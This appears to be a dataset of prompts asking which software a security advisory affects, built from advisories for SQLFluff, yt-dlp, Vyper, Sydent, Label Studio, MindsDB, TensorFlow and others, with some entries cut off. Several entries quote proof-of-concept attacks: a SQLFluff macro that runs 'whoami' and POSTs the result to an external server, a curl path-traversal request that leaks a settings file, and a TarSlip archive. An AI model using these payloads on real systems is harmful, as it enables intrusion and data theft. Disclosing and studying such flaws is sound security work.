Please identify the software name affected by it. Input: ### Impact\nIn environments where untrusted users have access to the config files (e.g. `.sqlfluff`), there is a potential security vulnerability where those users could use the `library_path` config value to allow arbitrary python code to be executed via macros. Jinja macros are executed within a [sandboxed environment](https://docs.snowflake.com/en/sql-reference/sql/show-warehouses) but the following example shows how an external url might be called and used to reveal internal information to an external listener:\n\n```ini\n[sqlfluff:templater:jinja]\nlibrary_path = /usr/lib/python3.9/http\n\n[sqlfluff:templater:jinja:macros]\na_macro_def = {{client.HTTPSConnection('<SOME_EXTERNAL_SERVER_YOU_CONTROL>').request('POST', '/', server.os.popen('whoami').read())}}\n```\n\nFor many users who use SQLFluff in the context of an environment where all users _already have fairly escalated privileges_, this may not be an issue - however in larger user bases, or where SQLFluff is bundled into another tool where developers still wish to give users access to supply their on _rule configuration_, this may be an issue.\n\n### Patches\nThe 2.1.2 release offers the ability for the `library_path` argument to be overwritten on the command line by using [the `--library-path` option](https://docs.sqlfluff.com/en/stable/cli.html#cmdoption-sqlfluff-lint-library-path). This overrides any values provided in the config files and effectively prevents this route of attack for users which have access to the config file, but not to the scripts which call the SQLFluff CLI directly. A similar option is provided for the Python API, where users also have a greater ability to further customise or override configuration as necessary. \n\nUnless `library_path` is explicitly required, we recommend using the option `--library-path none` when invoking SQLFluff which will disable the `library-path` option entirely regardless of the options set in the configuration file or via inline config directives.\n\n### Workarounds\nLimiting access to - or otherwise validating configuration files before they are ingested by SQLFluff will provide a similar effect and does not require upgrade.\n\n### Credit\nDan Amodio from the Tinder Red Team\n.

Please identify the software name affected by it. Input: ### Impact\nDuring file downloads, yt-dlp or the external downloaders that yt-dlp employs may leak cookies on HTTP redirects to a different host, or leak them when the host for download fragments differs from their parent manifest's host.\n\nThis vulnerable behavior is present in all versions of [youtube-dl](https://github.com/ytdl-org/youtube-dl), [youtube-dlc](https://github.com/blackjack4494/yt-dlc) and [yt-dlp](https://github.com/yt-dlp/yt-dlp) released since 2015.01.25. All native and external downloaders are affected, except for `curl` and `httpie` (httpie version 3.1.0 or later).\n\nAt the file download stage, all cookies are passed by yt-dlp to the file downloader as a `Cookie` header, thereby losing their scope. This also occurs in yt-dlp's info JSON output, which may be used by external tools. As a result, the downloader or external tool may indiscriminately send cookies with requests to domains or paths for which the cookies are not scoped.\n\nAn example of a potential attack scenario exploiting this vulnerability:\n1. an attacker has crafted a malicious website with an embedded URL designed to be detected by yt-dlp as a video download. This embedded URL has the domain of a trusted site that the user has loaded cookies for, and conducts an [unvalidated redirect](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) to a target URL.\n2. yt-dlp extracts this URL and calculates a `Cookie` header based on its domain for the file downloader to make its request(s) with.\n3. the download URL redirects to a server controlled by the attacker, to which yt-dlp forwards the user's sensitive cookie information.\n\n### Patches\nyt-dlp version 2023.07.06 fixes this issue by doing the following:\n\n- Remove the `Cookie` header upon HTTP redirects\n- Have native downloaders calculate their own `Cookie` header from the cookiejar\n- Utilize external downloaders' built-in support for cookies instead of passing them as header arguments\n- If the external downloader does not have proper cookie support, then disable HTTP redirection (`axel` only)\n- Process cookies passed as HTTP headers to limit their scope (`--add-header \"Cookie:...\"` is scoped to input URL domain only)\n- Store cookies in a separate `cookies` field of the info dict instead of `http_headers` so as not to lose their scope\n\nPatches for youtube-dl are expected and we will update this advisory when they are merged.\n\n### Workarounds\nIt is recommended to upgrade yt-dlp to version 2023.07.06 as soon as possible.\n\nFor users who are not able to upgrade:\n\n - Avoid using cookies and user authentication methods (`--cookies`, `--cookies-from-browser`, `--username`, `--password`, `--netrc`). While extractors may set custom cookies, these usually do not contain sensitive information.\n - Avoid using `--load-info-json`\n\nOr, if authentication is a must:\n\n- Verify the integrity of download links from unknown sources in browser (including redirects) before passing them to yt-dlp\n- Use `curl` as external downloader, since it is not impacted (`--downloader curl`)\n- Avoid fragmented formats such as HLS/m3u8, DASH/mpd and ISM (use `-f \"(bv*+ba/b)[protocol~='^https?$']\"`)\n\n### References\n- https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-v8mc-9377-rwjj\n- https://nvd.nist.gov/vuln/detail/CVE-2023-35934\n- https://github.com/yt-dlp/yt-dlp/releases/tag/2023.07.06\n- https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2023.07.06.185519\n- https://github.com/yt-dlp/yt-dlp/commit/1ceb657bdd254ad961489e5060f2ccc7d556b729\n- https://github.com/yt-dlp/yt-dlp/commit/f8b4bcc0a791274223723488bfbfc23ea3276641\n- https://github.com/yt-dlp/yt-dlp/commit/3121512228487c9c690d3d39bfd2579addf96e07.

Input: ### Impact\nthe ecrecover precompile does not fill the output buffer if the signature does not verify, see https://github.com/ethereum/go-ethereum/blob/b058cf454b3bdc7e770e2b3cec83a0bcb48f55ee/core/vm/contracts.go#L188. however, the ecrecover builtin will still return whatever is at memory location 0.\n\nthis means that the if the compiler has been convinced to write to the 0 memory location with specially crafted data (generally, this can happen with a hashmap access or immutable read) just before the ecrecover, a signature check might pass on an invalid signature.\n\nA contract search was performed. Most uses of `ecrecover` are used for erc2612-style permit implementations, which typically look like:\n\n```vyper\n    assert _owner != empty(address)\n    assert block.timestamp <= _deadline\n                  \n    nonce: uint256 = self.nonces[_owner]\n    digest: bytes32 = keccak256(\n        concat(   \n            b\"\\x19\\x01\",\n            self.DOMAIN_SEPARATOR,\n            keccak256(_abi_encode(PERMIT_TYPEHASH, _owner, _spender, _value, nonce, _deadline))\n        )         \n    )             \n    assert ecrecover(digest, convert(_v, uint256), convert(_r, uint256), convert(_s, uint256)) == _owner\n```\n\nin this case, the immutable `PERMIT_TYPEHASH` is loaded into `ecrecover`'s output buffer right before `ecrecover()`, and so the output of `ecrecover()` here when the signature is invalid will be the value of `PERMIT_TYPEHASH`. in this case, since `PERMIT_TYPEHASH` is not a valid address, it will never compare `==` to `_owner`, and so the behaviour is exactly the same as if `ecrecover()` returned 0 in this case.\n\nin general, a contract could have unexpected behavior (i.e. mistakenly pass this style of signature check) if an immutable representing a real address (ex. `OWNER`) was read right before the `ecrecover` operation.\n\n### Patches\nv0.3.10 (with 019a37ab98ff53f04fecfadf602b6cd5ac748f7f and #3586)\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n### References\n_Are there any links users can visit to find out more?_\n.

Please identify the software name affected by it. Input: ### Impact\n\nRestrictedPython does not check access to stack frames and their attributes. Stack frames are accessible within at least generators and generator expressions, which are allowed inside RestrictedPython. An attacker with access to a RestrictedPython environment can write code that gets the current stack frame in a generator and then walk the stack all the way beyond the RestrictedPython invocation boundary, thus breaking out of the restricted scope allowing the call of unrestricted Python code and therefore potentially allowing arbitrary code execution in the Python interpreter.\n\nAll RestrictedPython deployments that allow untrusted users to write Python code in the RestrictedPython environment are at risk. In terms of Zope and Plone, this would mean deployments where the administrator allows untrusted users to create and/or edit objects of type `Script (Python)`, `DTML Method`, `DTML Document` or `Zope Page Template`. This is a non-default configuration and likely to be extremely rare.\n\n### Patches\n\nThe problem has been fixed in releases 5.3 and 6.1.\n\n### Workarounds\n\nThere is no workaround available.

This makes  Sydent's emails vulnerable to interception via a [man-in-the-middle (MITM) attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack). Attackers with privileged access to the network can intercept room invitations and address confirmation emails.\n\nCVSS 3.1 overall score: 3.3 - [AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N/CR:L/IR:L/AR:X/MAV:A/MAC:H/MPR:N/MUI:N/MS:C/MC:L/MI:L/MA:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N/CR:L/IR:L/AR:X/MAV:A/MAC:H/MPR:N/MUI:N/MS:C/MC:L/MI:L/MA:N&version=3.1)\n\n_Reported by Martin Schobert, [Pentagrid AG](https://pentagrid.ch/)._\n\n### Details\n\nSydent can be configured to send emails over a TLS-encrypted socket by setting\n\n```yaml\nemail:\n    tlsmode: \"TLS\"  # or the legacy value \"SSL\"\n```\n\nin its config file. Alternatively it can be configured to use [Opportunistic TLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) by setting\n\n```yaml\nemail:\n    tlsmode: \"STARTTLS\"\n```\n\nIn both situations, Sydent will encrypt its communication with the SMTP server when sending emails. **In affected versions, Sydent will not verify the destination server's certificate.**\n\n### Vulnerability \n\nSydent sends email for two purposes:\n- to inform a third party that they have been invited to a Matrix room by their email address; and\n- to verify that a given Matrix user controls an email address.\n\nTherefore, attackers capable of running a MITM attack can\n\n1. Intercept room invitations sent to an email address. The invitation includes \n   - the room ID and its avatar, and\n   - the inviter's username, displayname and their avatar, and\n   - credentials for a guest Matrix account on the inviter's homeserver.\n2. Intercept address ownership confirmation emails. This would allow the attacker to falsely claim ownership of the indented recipient's Matrix account, if that account was permitted to log in using an email address and no other authentication factors.\n\n\n### Patches\n\nThis is patched in [Sydent 2.5.6](https://github.com/matrix-org/sydent/releases/tag/v2.5.6), see PR https://github.com/matrix-org/sydent/pull/574.\n\nWhen patching, make sure that Sydent trusts the certificate of the server it is connecting to. This should happen automatically when using properly issued certificates. If you are using self-signed certificates, make sure to copy your Certification Authority certificate, or your self signed certificate if using only one, to the trust store of your operating system.\n\n### Workarounds\n\nOne can ensure Sydent's emails fail to send by setting the configured SMTP server to a loopback or [non-routable](https://datatracker.ietf.org/doc/html/rfc1918#section-3) address under your control which does not have a listening SMTP server. For example:\n\n```yaml\nemail:\n    smtphost: \"localhost\"  # Assuming there is no SMTP server listening on localhost\n```\n\n### References\n\n- https://github.com/matrix-org/sydent/pull/574 implements the fix.\n- https://github.com/matrix-org/sydent/releases/tag/v2.5.6 is the release including this fix.\n- https://docs.python.org/3/library/ssl.html?highlight=ssl#security-considerations details the best-practice advice on how to use the standard library `smtp` module safely.\n- https://peps.python.org/pep-0476/ (accepted) proposed enabling TLS certificate verification by default  in standard library HTTP clients.\n- https://github.com/python/cpython/issues/91826 discusses enabling TLS certificate verification by default in the Python standard library, for SMTP and other protocols.\n\n## For more information\n\nIf you have any questions or comments about this advisory, e-mail us at [security@matrix.org](mailto:security@matrix.org)..

Input: # Server-Side Template Injection\n\n## Overview of the Vulnerability\n\nServer-Side Template Injection (SSTI) is a vulnerability within application templating engines where user input is improperly handled and is embedded into the template, possibly leading code being executed.\n\nAn attacker can use SSTI to execute code on the underlying system by manipulating values within the embedded template. When code is executed within the underlying system, it can allow an attacker to run permissioned commands under the exploited process, or exploit Cross-Site Scripting (XSS) to run code within the user's browser.\n\n## Business Impact\n\nSSTI can lead to reputational damage for the business due to a loss in confidence and trust by users. If an attacker successfully executes code within the underlying system, it can result in data theft and indirect financial losses.\n\n## Steps to Reproduce\n\n1.

Input: ### Issue\nSnowflake was informed via our bug bounty program of a command injection vulnerability in the Snowflake Python connector via SSO browser URL authentication. \n\n### Impacted driver package: \nsnowflake-connector-python\n\n### Impacted version range: \nbefore [Version 3.0.2](https://community.snowflake.com/s/article/Snowflake-Connector-for-Python-Release-Notes)\n\n### Attack Scenario\nIn order to exploit the potential for command injection, an attacker would need to be successful in (1) establishing a malicious resource and (2) redirecting users to utilize the resource. The attacker could set up a malicious, publicly accessible server which responds to the SSO URL with an attack payload. If the attacker then tricked a user into visiting the maliciously crafted connection URL, the user\u2019s local machine would render the malicious payload, leading to a remote code execution. \n\nThis attack scenario can be mitigated through URL whitelisting as well as common anti-phishing resources.   \n\n### Solution\nOn March 23rd, 2023, Snowflake merged a patch that fixed a command injection vulnerability in the Snowflake Python connector via SSO browser URL authentication. The vulnerability affected the Snowflake Python connector before Version 3.0.2. We strongly recommend users upgrade to Version 3.0.2 as soon as possible via the following resources: [Snowflake Python Connector](https://docs.snowflake.com/en/developer-guide/python-connector/python-connector)\n\n### Additional Information\nIf you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne.

Input: ### Impact\n\nKiwi TCMS allows users to upload attachments to test plans, test cases, etc. Earlier versions of Kiwi TCMS had introduced upload validators in order to prevent potentially dangerous files from being uploaded and Content-Security-Policy definition to prevent cross-site-scripting attacks. \n\nThe upload validation checks were not 100% robust which left the possibility to circumvent them and upload a potentially dangerous file which allows execution of arbitrary JavaScript in the browser. Additionally we've discovered that Nginx's `proxy_pass` directive will strip some headers negating protections built into Kiwi TCMS when served behind a reverse proxy.\n\n### Patches\n\n- Improved file upload validation code\n- Updated Nginx reverse proxy configuration for ***.tenant.kiwitcms.org**\n\n### Workarounds\n\nIf serving Kiwi TCMS behind a reverse proxy make sure that additional header values are still passed to the client browser. If they aren't redefine them inside the proxy configuration.

Input: ### Background\nDuring the audit of [Lido's Gate Seals](https://github.com/lidofinance/gate-seals) code [statemind](https://statemind.io) team identified a weird behavior of the code that uses `raw_call`: https://github.com/lidofinance/gate-seals/blob/051593e74df01a4131c485b4fda52e691cd4b7d8/contracts/GateSeal.vy#L164 .\n\nConstruction like this:\n```vyper\nsuccess = raw_call(\n    sealable,\n    _abi_encode(SEAL_DURATION_SECONDS, method_id=method_id(\"pauseFor(uint256)\")),\n    revert_on_failure=False\n)\n```\nwas not fully documented: https://docs.vyperlang.org/en/v0.3.7/built-in-functions.html#raw_call .\n\nThe documentation says that: if `max_outsize=0` it should return nothing and then it says that if `revert_on_failure=False` it should return a `success` flag in the tuple of response, but what if `max_outsize=0`  and `revert_on_failure=False`.\n\n<img width=\"715\" alt=\"image\" src=\"https://user-images.githubusercontent.com/22330612/232125364-d2b3bbac-0b4f-40cb-80ff-f55d8eafef44.png\">\n\n So the team started researching what exactly happened in that case, after some research we found that the Vyper compiler generates the wrong bytecode in that case, it generates the sequence:\n```\nCALL // call\nMLOAD // MLOAD is wrong since the CALL result is already stored in the stack\n```\n\n### Impact\nExample of buggy code:\n```vyper\n@external\ndef returnSome(calling: address, a: uint256) -> bool:\n    success: bool = false\n    success = raw_call(\n        calling,\n        _abi_encode(a, method_id=method_id(\"a(uint256)\")),\n        revert_on_failure=False\n        )\n```\n\nany contract that uses the `raw_call` with `revert_on_failure=False` and `max_outsize=0` receives the wrong response from `raw_call`. Depending on the memory garbage, the result can be either `True` or `False`.\n\n### Patches\nFix by @charles-cooper https://github.com/vyperlang/vyper/commit/851f7a1b3aa2a36fd041e3d0ed38f9355a58c8ae\n\n### Workarounds\nThe simple workaround is always to put  `max_outsize>0`.\nWorkaround example https://github.com/lidofinance/gate-seals/pull/5/files\n\n### References\nLido's fix: https://github.com/lidofinance/gate-seals/pull/5/files\n.

A user with a limited-permission editor account for the Wagtail admin could potentially craft pages and documents that, when viewed by a user with higher privileges, could perform actions with that user's credentials. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin, and only affects sites with ModelAdmin enabled.\n\n- For page, the vulnerability is in the \"Choose a parent page\" ModelAdmin view ([`ChooseParentView`](https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#customising-chooseparentview)), available when managing pages via ModelAdmin.\n- For documents, the vulnerability is in the ModelAdmin Inspect view ([`InspectView`](https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#enabling-customising-inspectview)) when displaying document fields.\n\n### Patches\n\nPatched versions have been released as Wagtail 4.1.4 (for the LTS 4.1 branch) and Wagtail 4.2.2 (for the current 4.2 branch).\n\n### Workarounds\n\nSite owners who are unable to upgrade to the new versions can disable or override the corresponding functionality.\n\n#### `ChooseParentView`\n\nFor [`ChooseParentView`](https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#modeladmin-choose-parent-view-class):\n\n- Disable ModelAdmin for all page models.\n- Or provide a custom view via [`choose_parent_view_class`](https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#id4), with the custom view overriding the `get_form` method.\n\nOne of those steps need to be applied for every `ModelAdmin` class hooked into Wagtail where the model is a Wagtail `Page` or sub-class. Here is an example of implementing the custom `ChooseParentView` with patched HTML escaping:\n\n```python\nfrom django import forms\nfrom django.utils.translation import gettext as _\nfrom wagtail.contrib.modeladmin.views import ChooseParentView\nfrom wagtail.contrib.modeladmin.forms import ParentChooserForm\n\n\nclass PatchedPageChoiceField(forms.ModelChoiceField):\n    \"\"\"PageChoiceField with plain-text breadcrumbs to patch stored XSS.\"\"\"\n    def label_from_instance(self, obj):\n        bits = []\n        for ancestor in (\n            obj.get_ancestors(inclusive=True).exclude(depth=1).specific(defer=True)\n        ):\n            bits.append(ancestor.get_admin_display_title())\n        return ' | '.join(bits)\n\n\nclass PatchedParentChooserForm(ParentChooserForm):\n    \"\"\"ParentChooserForm with custom parent_page to patch stored XSS.\"\"\"\n    parent_page = PatchedPageChoiceField(\n        label=_(\"Parent page\"),\n        required=True,\n        empty_label=None,\n        queryset=Page.objects.none(),\n        widget=forms.RadioSelect(),\n    )\n\n\nclass PatchedChooseParentView(ChooseParentView):\n    \"\"\"ChooseParentView with custom get_form patch stored XSS.\"\"\"\n    def get_form(self, request):\n        parents = self.permission_helper.get_valid_parent_pages(request.user)\n        return PatchedParentChooserForm(parents, request.POST or None)\n```\n\n#### `InspectView`\n\nFor [`InspectView`](https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#enabling-customising-inspectview):\n\n- Remove `inspect_view_enabled=True` or set it to False to disable the view.\n- Or use [`inspect_view_fields`](https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#modeladmin-inspect-view-fields) or [`inspect_view_fields_exclude`](https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#modeladmin-inspect-view-fields-exclude) to prevent displaying document fields in the views.\n- Or provide a custom view via [`inspect_view_class`](https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#id12), with the custom view overriding the `get_document_field_display` method.\n\nOne of those steps need to be applied for every `ModelAdmin` class hooked into Wagtail where `inspect_view_enabled=True`.

Input: ### Impact\nKiwi TCMS allows users to upload attachments to test plans, test cases, etc. In earlier versions there is no control over what kinds of files can be uploaded. Thus a malicious actor may upload an `.exe` file or a file containing embedded JavaScript and trick others into clicking on these files causing vulnerable browsers to execute malicious code on another computer or attempting XSS attacks.\n\nStored XSS attacks via file uploads have been fixed in earlier versions of Kiwi TCMS, see [GHSA-2wcr-87wf-cf9j](https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-2wcr-87wf-cf9j). This advisory deals with prohibiting users to upload potentially compromised files in the first place.\n\n\n### Patches\nKiwi TCMS v12.2 comes with functionality that allows administrators to configure additional upload validator functions which give them more control over what file types are accepted for upload. By default `.exe` are denied. Other files containing the `<script>` tag, regardless of their type are also denied b/c they are a path to XSS attacks.\n\n\n\n### Workarounds\nUpgrade to version 12.2 or later.\n\n### References\nOriginally reported by [Ahmed Rabeaa Mosaa](https://huntr.dev/bounties/c30d3503-600d-4d00-9571-98826a51f12c)..

Please identify the software name affected by it. Input: ### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0.

Please identify the software name affected by it. Input: ### Summary\n\nAn unsafe extraction is being performed using `shutil.unpack_archive()` from a remotely retrieved tarball. Which may lead to the writing of the extracted files to an unintended location. This vulnerability is sometimes called a **TarSlip** or a **ZipSlip variant**.\n\n### Details\n\nUnpacking files using the high-level function `shutil.unpack_archive()` from a potentially malicious tarball without validating that the destination file path remained within the intended destination directory may cause files to be overwritten outside the destination directory.\n\nAs can be seen in the vulnerable snippet code source, an archive is being retrieved using the `download_file()` function from a remote location which is a user-provided permanent storage bucket `s3`. Immediately after being retrieved, the tarball is unsafely unpacked using the function `shutil.unpack_archive()`.\n\nThe vulnerable code is [L128..L129](https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py#L128..L129) in [fs.py](https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py) file.\n\n```python3\n    def __init__(self):\n        super().__init__()\n        if 's3_credentials' in self.config['permanent_storage']:\n            self.s3 = boto3.client('s3', **self.config['permanent_storage']['s3_credentials'])\n        else:\n            self.s3 = boto3.client('s3')\n       \n        # User provided remote storage!\n        self.bucket = self.config['permanent_storage']['bucket'] \n\n    def get(self, local_name, base_dir):\n        remote_name = local_name\n        remote_ziped_name = f'{remote_name}.tar.gz'\n        local_ziped_name = f'{local_name}.tar.gz'\n        local_ziped_path = os.path.join(base_dir, local_ziped_name)\n        os.makedirs(base_dir, exist_ok=True)\n        \n        # Retrieve a potentially malicious tarball\n        self.s3.download_file(self.bucket, remote_ziped_name, local_ziped_path)\n\n        # Perform an unsafe extraction\n        shutil.unpack_archive(local_ziped_path, base_dir)\n\n        os.system(f'chmod -R 777 {base_dir}')\n        os.remove(local_ziped_path)\n```  \n\n### PoC\n\nThe following PoC is provided for illustration purposes only. It showcases the risk of extracting a non-harmless text file `sim4n6.txt` to one of the parent locations rather than the intended current folder.\n\n```bash\n> tar --list -f archive.tar\ntar: Removing leading \"../../../\" from member names\n../../../sim4n6.txt\n\n> python3 \nPython 3.10.6 (main, Nov  2 2022, 18:53:38) [GCC 11.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import shutil\n>>> shutil.unpack_archive(\"archive.tar\")\n>>> exit()\n\n> test -f ../../../sim4n6.txt && echo \"sim4n6.txt exists\"\nsim4n6.txt exists\n```\n\n### Attack Scenario\n\nAn attacker could craft a malicious tarball with a filename path, such as `../../../../../../../../etc/passwd`, and then serve the archive remotely using a personal bucket `s3`, thus, retrieve the tarball through **mindsdb** and overwrite the system files of the hosting server. \n\n### Mitigation\n\nPotential mitigation could be to:\n - Use a safer module, like `zipfile`.\n -  Validate the location of the extracted files and discard those with malicious paths such as relative path `..` or absolute path such as `/etc/password`.\n -  Perform a checksum verification for the retrieved archive, but hard-coding the hashes may be cumbersome and difficult to manage..

Please identify the software name affected by it. Input: ### Impact\n\nWhen using the [Django integration](https://docs.sentry.io/platforms/python/guides/django/) of the Sentry SDK in a specific configuration it is possible to leak sensitive cookies values, including the session cookie to Sentry. These sensitive cookies could then be used by someone with access to your Sentry issues to impersonate or escalate their privileges within your application.\n\nThe below must be true in order for these sensitive values to be leaked:\n1. Your Sentry SDK configuration has `sendDefaultPII` set to `True`\n2. You are using a custom name for either of the cookies below in your Django settings.\n  - [`SESSION_COOKIE_NAME`](https://docs.djangoproject.com/en/4.1/ref/settings/#std-setting-SESSION_COOKIE_NAME) or \n  - [`CSRF_COOKIE_NAME`](https://docs.djangoproject.com/en/4.1/ref/settings/#std-setting-CSRF_COOKIE_NAME) Django settings\n3. You are not configured in your organization or project settings to use [our data scrubbing features](https://docs.sentry.io/product/data-management-settings/scrubbing/) to account for the custom cookie names\n\n### Patches\nAs of version `1.14.0`, the Django integration of the `sentry-sdk` will detect the custom cookie names based on your Django settings and will remove the values from the payload _before_ sending the data to Sentry.\n\n### Workarounds\n\nIf you can not update your `sentry-sdk` to a patched version than you can use the SDKs filtering mechanism to remove the cookies from the payload that is sent to Sentry. For error events this can be done with the [before_send](https://docs.sentry.io/platforms/python/configuration/filtering/#using-platformidentifier-namebefore-send-) callback method and for performance related events (transactions) you can use the [before_send_transaction](https://docs.sentry.io/platforms/python/configuration/filtering/#using-platformidentifier-namebefore-send-transaction-) callback method.\n\nIf you'd like to handle filtering of these values on the server-side, you can also use our [advanced data scrubbing feature](https://docs.sentry.io/product/data-management-settings/scrubbing/advanced-datascrubbing/) to account for the custom cookie names. Look for the `$http.cookies`, `$http.headers`, `$request.cookies`, or `$request.headers` fields to target with your scrubbing rule.\n\n### References\n- [Using Your Tools Against You (Chapter8 Blog Post)](https://medium.com/@tomwolters/using-your-tools-against-you-cea4d2482ebb)\n- [Sentry Python SDK Filtering](https://docs.sentry.io/platforms/python/configuration/filtering/)\n- [Sentry Data Scrubbing](https://docs.sentry.io/product/data-management-settings/scrubbing/advanced-datascrubbing/)\n\n### Credits\n- [Tom Wolters (Chapter8)](https://chapter8.com)\n.

If you generated your config secrets in a more secure way, they are not known to be compromised, but you should still upgrade Lemur to ensure that you receive code fixes for the runtime-generated secrets.\n\nFor general information and guidance on Lemur secret configuration, see [Lemur's configuration documentation](https://lemur.readthedocs.io/en/latest/administration.html#configuration), which includes information on many of the configuration options listed above.\n\n*For the user passwords: Even though these users are configured to use SSO, they do get generated with valid database passwords that can be used to log in. Since Lemur doesn't have an option to change passwords (#3888), one option for rotating them would be to directly modify the value in the database to some other unguessable string (you do not need to know the plaintext password since it won't be used).\n\n### Patches\nThe patch is available in v1.3.2.\n\n### Workarounds\nNo workarounds are available.\n\n### References\nN/A.

A better long-term solution may be to have the \"new importer\" handle generic functions.\n\n### Patches\nWe have patched the issue in GitHub\n- commit [760322a71ac9033e122ef1f4b1c62813021e5938](https://github.com/tensorflow/tensorflow/commit/760322a71ac9033e122ef1f4b1c62813021e5938).\n- commit [2eedc8f676d2c3b8be9492e547b2bc814c10b367](https://github.com/tensorflow/tensorflow/commit/2eedc8f676d2c3b8be9492e547b2bc814c10b367)\n\nThe fix will be included in TensorFlow 2.12.0.

Please identify the software name affected by it. Input: ### Impact\nA malicious invalid input crashes a tensorflow model (Check Failed) and can be used to trigger a denial of service attack.\nTo minimize the bug, we built a simple single-layer TensorFlow model containing a Convolution3DTranspose layer, which works well with expected inputs and can be deployed in real-world systems. However, if we call the model with a malicious input which has a zero dimension, it gives Check Failed failure and crashes. \n```python\nimport tensorflow as tf\n\nclass MyModel(tf.keras.Model):\n    def __init__(self):\n        super().__init__()\n        self.conv = tf.keras.layers.Convolution3DTranspose(2, [3,3,3], padding=\"same\")\n        \n    def call(self, input):\n        return self.conv(input)\nmodel = MyModel() # Defines a valid model.\n\nx = tf.random.uniform([1, 32, 32, 32, 3], minval=0, maxval=0, dtype=tf.float32) # This is a valid input.\noutput = model.predict(x)\nprint(output.shape) # (1, 32, 32, 32, 2)\n\nx = tf.random.uniform([1, 32, 32, 0, 3], dtype=tf.float32) # This is an invalid input.\noutput = model(x) # crash\n```\nThis Convolution3DTranspose layer is a very common API in modern neural networks. The ML models containing such vulnerable components could be deployed in ML applications or as cloud services. This failure could be potentially used to trigger a denial of service attack on ML cloud services.\n\n### Patches\nWe have patched the issue in\n- GitHub commit [948fe6369a5711d4b4568ea9bbf6015c6dfb77e2](https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2)\n- GitHub commit [85db5d07db54b853484bfd358c3894d948c36baf](https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf).\n\nThe fix will be included in TensorFlow 2.12.0.

Sometimes, the vulnerability is called a TarSlip or a ZipSlip variant.\n\n### Details\n\nI commented the following snippet of code as a vulnerability details. The code is from [file.py#L26..L134](https://github.com/mindsdb/mindsdb/blob/afedd37c16e579b6dc075b0814e42d0505ccdc07/mindsdb/api/http/namespaces/file.py#L26..L134)\n\n```python\n@ns_conf.route('/<name>')\n@ns_conf.param('name', \"MindsDB's name for file\")\nclass File(Resource):\n    @ns_conf.doc('put_file')\n    def put(self, name: str):\n        ''' add new file\n            params in FormData:\n                - file\n                - original_file_name [optional]\n        '''\n\n        data = {}\n\n        ... omitted for brevity\n\n            url = data['source']\n            data['file'] = data['name']\n\n            ... omitted for brevity \n\n            with requests.get(url, stream=True) as r:                   # Source: retrieve the URL which point to a remotely located tarball \n                if r.status_code != 200:\n                    return http_error(\n                        400,\n                        \"Error getting file\",\n                        f\"Got status code: {r.status_code}\"\n                    )\n                file_path = os.path.join(temp_dir_path, data['file'])\n                with open(file_path, 'wb') as f:\n                    for chunk in r.iter_content(chunk_size=8192):   # write with chunks the remote retrieved file into file_path location \n                        f.write(chunk)\n\n        original_file_name = data.get('original_file_name')\n\n        file_path = os.path.join(temp_dir_path, data['file'])      \n        lp = file_path.lower()\n        if lp.endswith(('.zip', '.tar.gz')):\n            if lp.endswith('.zip'):\n                with zipfile.ZipFile(file_path) as f:\n                    f.extractall(temp_dir_path)\n            elif lp.endswith('.tar.gz'):\n                with tarfile.open(file_path) as f:  # Just after \n                    f.extractall(temp_dir_path)  # Sink: the tarball located by file_path is supposed to be extracted to temp_dir_path. \n```\n\nSo, a remotely available tarball is being retrieved and written to the server filesystem in chunks, and then, if the extension ends with `.tar.gz` of a compressed tarball, the mindsdb app applies `tarfile.extractall()` directly with no checks for the destination. \n\nHowever, according to the following [warning](https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall) from the official documentation;\n\n> Warning: Never extract archives from untrusted sources without prior inspection. It is possible that files are created outside of path, e.g. members that have absolute filenames starting with \"/\" or 